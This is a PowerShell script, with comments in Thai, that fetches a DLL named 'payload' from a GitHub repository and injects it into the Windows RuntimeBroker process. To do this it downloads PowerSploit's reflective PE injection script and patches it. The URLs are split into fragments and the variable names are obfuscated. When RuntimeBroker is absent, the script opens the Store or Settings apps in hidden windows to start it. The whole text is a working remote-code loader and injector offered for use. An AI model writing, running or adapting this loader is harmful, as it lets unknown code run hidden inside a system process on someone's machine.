$ErrorActionPreference = "Stop"

# URL ของ DLL ที่จะ inject
$_0x91A = @(
"https://raw",
".githubusercontent",
".com/t3rm1n4l-inf1c0z",
"/fivem/refs",
"/heads/main/",
"payload"
) -join ""

# หา RuntimeBroker process
$targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1

if ($null -eq $targetProc) {
    # เปิด Windows Store เพื่อ trigger RuntimeBroker
    Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    
    $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if ($null -eq $targetProc) {
        # ลองเปิด Settings app
        Start-Process "ms-settings:" -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        
        $targetProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
        
        if ($null -eq $targetProc) {
            Write-Host "[ERROR] RuntimeBroker not found" -ForegroundColor Red
            exit 1
        }
    }
}

$targetPID = $targetProc.Id

# ดาวน์โหลด DLL
$_0x7C1 = New-Object System.Net.WebClient
$_0x7C1.Headers.Add("User-Agent", "Mozilla/5.0")
$_0x5F9 = $_0x7C1.DownloadData($_0x91A)

if ($_0x5F9.Length -eq 0) {
    Write-Host "[ERROR] Failed to download DLL" -ForegroundColor Red
    exit 1
}

# ดาวน์โหลด Reflective PE Injection script
$_0x3D2 = @(
"https://raw",
".githubusercontent",
".com/PowerShellMafia",
"/PowerSploit/master",
"/CodeExecution/",
"Invoke-ReflectivePEInjection.ps1"
) -join ""

$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing

# แก้ไข script
$_0xA77 = Get-Content $_0x8E4 -Raw
$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'

$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
$_0xA77 | Set-Content $_0xC11 -Encoding UTF8

# โหลด injection script
. $_0xC11

# Inject
try {
    Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $targetPID
    Write-Host "[SUCCESS] Injection completed!" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Injection failed: $_" -ForegroundColor Red
    exit 1
}
